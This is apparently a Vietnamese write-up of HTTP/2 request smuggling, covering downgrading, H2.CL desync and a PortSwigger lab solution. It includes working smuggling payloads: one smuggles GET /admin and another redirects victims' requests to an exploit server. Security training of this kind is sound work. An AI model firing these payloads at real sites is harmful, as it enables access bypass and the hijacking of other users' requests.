# Advanced request smuggling

Trong phần này ta sẽ tìm hiểu về smuggling với HTTP/2

# HTTP/2 request smuggling

HTTP/2 lại làm cho dễ xảy ra cuộc tấn công smuggling cho dù nó được phát minh ra để cản lỗ hổng này 

## HTTP/2 message length

Về cơ bản, request smuggling nhằm khai thác sự không thống nhất giữa cách các máy chủ khác nhau diễn giải độ dài của một yêu cầu. `HTTP/2` giới thiệu một cơ chế đơn lẻ và mạnh mẽ để xử lý vấn đề này, từ lâu đã được cho là giúp `HTTP/2` miễn nhiễm với request smuggling.

Mặc dù không thấy điều này trong Burp, các thông điệp HTTP/2 được gửi qua mạng dưới dạng một chuỗi các "khung" riêng biệt. Mỗi khung đều có trường độ dài rõ ràng, cho máy chủ biết chính xác số byte cần đọc vào. Do đó, độ dài của yêu cầu là tổng độ dài các khung của nó.

Lý thuyết cho rằng cơ chế này sẽ không để lại bất kỳ cơ hội nào cho kẻ tấn công để tạo ra sự không rõ ràng cần thiết cho request smuggling, miễn là trang web sử dụng `HTTP/2` từ đầu đến cuối. Tuy nhiên, trong thực tế, điều này thường không đúng do việc downgrand HTTP/2 xuống HTTP/1.

## HTTP/2 downgrading

`Downgrading HTTP/2` là quá trình viết lại các yêu cầu HTTP/2 theo cú pháp HTTP/1 để tạo ra một yêu cầu HTTP/1 tương đương. Các máy chủ web và reverse proxy thường thực hiện điều này để cung cấp hỗ trợ HTTP/2 cho các client trong khi vẫn giao tiếp với các máy chủ back-end chỉ hỗ trợ `HTTP/1`. Việc giảm cấp này là điều kiện tiên quyết cho nhiều cuộc tấn công được đề cập trong phần này.

## H2.CL vulnerabilities
Yêu cầu HTTP/2 không cần phải xác định độ dài rõ ràng trong một header. Khi giảm cấp, điều này khiến các máy chủ front-end thường thêm một header `Content-Length` của HTTP/1, và xác định giá trị của nó dựa trên cơ chế độ dài có sẵn của HTTP/2. Điều thú vị là các yêu cầu HTTP/2 cũng có thể tự bao gồm header `content-length`. Trong trường hợp này, một số máy chủ front-end sẽ chỉ sử dụng lại giá trị này trong yêu cầu HTTP/1 được tạo ra.

Theo đặc tả, bất kỳ header `content-length` nào trong yêu cầu HTTP/2 đều phải khớp với độ dài được tính bằng cơ chế nội bộ, nhưng điều này không phải lúc nào cũng được kiểm tra chặt chẽ trước khi giảm cấp. Kết quả là, có thể tiến hành tấn công smuggling bằng cách tiêm vào một header `content-length` gây hiểu lầm. Mặc dù front-end sẽ sử dụng độ dài ngầm định của HTTP/2 để xác định điểm kết thúc của yêu cầu, nhưng back-end HTTP/1 phải tham chiếu đến header `Content-Length` có nguồn gốc từ header đã tiêm vào, dẫn đến sự không đồng bộ.

Ví dụ: Phía Front-end (HTTP/2)
```http
            :method	        POST
            :path	        /example
            :authority	    vulnerable-website.com
            content-type	application/x-www-form-urlencoded
            content-length	0
GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```

Phía Back-end (HTTP/1)
```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1GET / H
```
Mẹo: Khi thực hiện một số cuộc tấn công smuggling, bạn sẽ muốn các header từ yêu cầu của nạn nhân được nối thêm vào tiền tố đã tiêm vào. Tuy nhiên, trong một số trường hợp, điều này có thể cản trở cuộc tấn công, dẫn đến các lỗi header trùng lặp và các vấn đề tương tự. Trong ví dụ trên, chúng tôi đã giảm thiểu vấn đề này bằng cách thêm một tham số ở cuối và một header `Content-Length` vào tiền tố đã tiêm vào. Bằng cách sử dụng một header `Content-Length` dài hơn một chút so với phần thân, yêu cầu của nạn nhân vẫn sẽ được nối vào tiền tố đã tiêm vào nhưng sẽ bị cắt ngắn trước phần header.

---

## 1. H2.CL request smuggling
https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling

Tắt update content-length, 
Đầu tiên ta gửi:
```http
POST / HTTP/2
Host: 0a43001c03c0c81780393f6f006100c9.web-security-academy.net
Content-Length: 0

SMUGGLED
```
với request thứ 2 ta thấy nó trả về 404 chứng tỏ ta đã điều hướng nó request lỗi.

máy chủ front-end sẽ lấy lại content-length = 0 trong http2 và vì thế nó sẽ thực hiện gửi 2 request


Payload:
```http
POST / HTTP/2
Host: 0a43001c03c0c81780393f6f006100c9.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0ad2007b0394c85b80693ee2018f005e.exploit-server.net
Content-Length: 5

x=1
```
Nó sẽ làm chuyển hướng request đến exploit server












